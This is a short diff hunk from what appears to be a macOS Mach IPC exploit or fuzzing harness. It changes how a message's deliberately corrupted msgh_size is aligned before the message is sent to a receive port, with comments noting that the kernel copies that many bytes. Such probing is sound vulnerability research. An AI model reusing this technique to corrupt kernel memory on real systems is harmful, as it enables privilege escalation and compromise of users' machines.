@@ -1423,14 +1423,19 @@ cleanup:
                                 mach_msg_header_t *hdr = (mach_msg_header_t *)msgBuf;
                                 // Simple send: COPY_SEND to remote, no reply port
                                 hdr->msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0);
-                                hdr->msgh_size = (mach_msg_size_t)szAfter;  // CORRUPTED size
+                                // Mach requires msgh_size to be 4-byte aligned
+                                mach_msg_size_t sendSz = (mach_msg_size_t)szAfter;
+                                sendSz = (sendSz + 3) & ~3;  // round up to 4
+                                if (sendSz < sizeof(mach_msg_header_t))
+                                    sendSz = sizeof(mach_msg_header_t);
+                                hdr->msgh_size = sendSz;
                                 hdr->msgh_remote_port = recvPort;
                                 hdr->msgh_local_port = MACH_PORT_NULL;
                                 hdr->msgh_id = 0x1337;
 
                                 scopeNote(r, [NSString stringWithFormat:
-                                    @"  sending: msgh_bits=0x%x msgh_size=%u remote=%u id=0x%x",
-                                    hdr->msgh_bits, (unsigned)hdr->msgh_size, recvPort, hdr->msgh_id]);
+                                    @"  sending: msgh_bits=0x%x msgh_size=%u (orig 0x%x, aligned) remote=%u id=0x%x",
+                                    hdr->msgh_bits, (unsigned)sendSz, (unsigned)szAfter, recvPort, hdr->msgh_id]);
 
                                 // Send with corrupted size — kernel copies msgh_size bytes
                                 kr = mach_msg(hdr,
